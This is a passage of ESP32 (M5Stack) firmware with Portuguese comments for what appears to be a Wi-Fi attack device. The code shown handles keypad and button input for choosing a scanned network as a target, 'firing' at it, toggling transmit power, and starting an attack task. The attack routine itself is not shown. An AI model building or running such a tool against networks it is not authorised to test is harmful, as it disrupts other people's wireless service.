#define TCA8418_KEY_LCK_EC 0x03
#define TCA8418_KEY_EVENT_A 0x04

void inicializar_teclado() {
    M5.In_I2C.writeRegister8(TCA8418_ADDR, TCA8418_KP_GPIO1, 0xFF, 400000);
    M5.In_I2C.writeRegister8(TCA8418_ADDR, TCA8418_KP_GPIO2, 0xFF, 400000);
    M5.In_I2C.writeRegister8(TCA8418_ADDR, TCA8418_KP_GPIO3, 0x03, 400000);
    M5.In_I2C.writeRegister8(TCA8418_ADDR, TCA8418_CFG, 0x00, 400000); 
    ESP_LOGI("TECLADO", "TCA8418 Inicializado com sucesso!");
}

void task_controles(void *pvParameters) {
    inicializar_teclado();
    
    while (true) {
        M5.update(); 
        
        // --- 1. LEITURA DO TECLADO FÍSICO (TCA8418) ---
        uint8_t ec = M5.In_I2C.readRegister8(TCA8418_ADDR, TCA8418_KEY_LCK_EC, 400000);
        uint8_t count = ec & 0x0F; 
        
        while (count > 0) {
            uint8_t event = M5.In_I2C.readRegister8(TCA8418_ADDR, TCA8418_KEY_EVENT_A, 400000);
            bool pressed = (event & 0x80) != 0;
            uint8_t keycode = event & 0x7F; 
            
            if (pressed) {
                if (estado_atual.load() == ESTADO_SELECIONAR && total_alvos > 0) {
                    if (keycode == 58) { // Tecla de navegação (para baixo)
                        alvo_selecionado = (alvo_selecionado + 1) % total_alvos; 
                        desenhar_menu();
                    }
                    // --- TOGGLE DE POTÊNCIA MANUAL (Tecla 'p' = keycode 112) ---
                if (keycode == 112) {
                    bool current_pwr = tx_power_max.load();
                    tx_power_max.store(!current_pwr);
                    flag_update_config.store(true); // Avisa a task de ataque para mudar a potência do rádio
                    if (estado_atual.load() == ESTADO_SELECIONAR) {
                        desenhar_menu();
                    }
                    ESP_LOGI("TECLADO", "Potencia alterada para: %s", tx_power_max.load() ? "MAX" : "ECO");
                }
                    else if (keycode == 67) { // Tecla Enter (Atirar)
                        uint8_t ch = 1;
                        if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) {
                            ch = alvos_encontrados[alvo_selecionado].primary;
                            xSemaphoreGive(scan_mutex);
                        }
                        canal_atual_alvo.store(ch); 
                        analisar_alvo_automaticamente(alvo_selecionado); 
                        modo_ativo.store(MODO_AUTOMATICO); 
                        
                        if(xSemaphoreTake(display_mutex, portMAX_DELAY)) { M5.Display.clear(); xSemaphoreGive(display_mutex); }
                        flag_update_config.store(true); estado_atual.store(ESTADO_ATIRAR);
                    }
                }
                else if (estado_atual.load() == ESTADO_ATIRAR) {
                    if (keycode == 97) { // Tecla Voltar/Esc (Parar Ataque)
                        alvo_perdido.store(false); 
                        estado_atual.store(ESTADO_SELECIONAR); 
                        escanear_redes(); 
                        desenhar_menu();
                    }
                }
            }
            count--;
        }
        
        // --- 2. BACKUP: BOTÃO LATERAL G0 (M5.BtnA) ---
        if (estado_atual.load() == ESTADO_SELECIONAR && total_alvos > 0) {
            if (M5.BtnA.wasPressed()) { 
                alvo_selecionado = (alvo_selecionado + 1) % total_alvos; 
                desenhar_menu(); 
            }
            if (M5.BtnA.pressedFor(1000)) {
                uint8_t ch = 1;
                if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) { ch = alvos_encontrados[alvo_selecionado].primary; xSemaphoreGive(scan_mutex); }
                canal_atual_alvo.store(ch); analisar_alvo_automaticamente(alvo_selecionado); modo_ativo.store(MODO_AUTOMATICO); 
                if(xSemaphoreTake(display_mutex, portMAX_DELAY)) { M5.Display.clear(); xSemaphoreGive(display_mutex); }
                flag_update_config.store(true); estado_atual.store(ESTADO_ATIRAR);
                while(M5.BtnA.isPressed()) { M5.update(); vTaskDelay(10); } 
            }
        } else if (estado_atual.load() == ESTADO_ATIRAR) {
            if (M5.BtnA.pressedFor(1000)) {
                alvo_perdido.store(false); estado_atual.store(ESTADO_SELECIONAR); escanear_redes(); desenhar_menu();
                while(M5.BtnA.isPressed()) { M5.update(); vTaskDelay(10); } 
            }
        }
        vTaskDelay(pdMS_TO_TICKS(50)); 
    }
}

// ===================================================================
// 8. APP MAIN
// ===================================================================

extern "C" void app_main(void) {
    auto cfg = M5.config(); M5.begin(cfg); M5.Display.setRotation(1); M5.Display.setTextSize(1.5);
    
    display_mutex = xSemaphoreCreateMutex();
    scan_mutex = xSemaphoreCreateMutex();
    
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    esp_netif_init(); esp_event_loop_create_default();
    
    wifi_init_config_t wifi_cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&wifi_cfg); 
    esp_wifi_set_storage(WIFI_STORAGE_RAM); 
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start(); 
    esp_wifi_set_ps(WIFI_PS_NONE); 

    // Inicialização de tarefas
    xTaskCreatePinnedToCore(task_ataque, "ataque", 4096, NULL, 10, NULL, 0); 
    xTaskCreatePinnedToCore(task_monitoramento, "monitor", 4096, NULL, 1, NULL, 1); 
    xTaskCreatePinnedToCore(task_display, "display", 4096, NULL, 1, NULL, 1); 
    xTaskCreatePinnedToCore(task_controles, "controles", 4096, NULL, 5, NULL, 1); 

    vTaskDelay(pdMS_TO_TICKS(1000)); 
    escanear_redes(); desenhar_menu();
}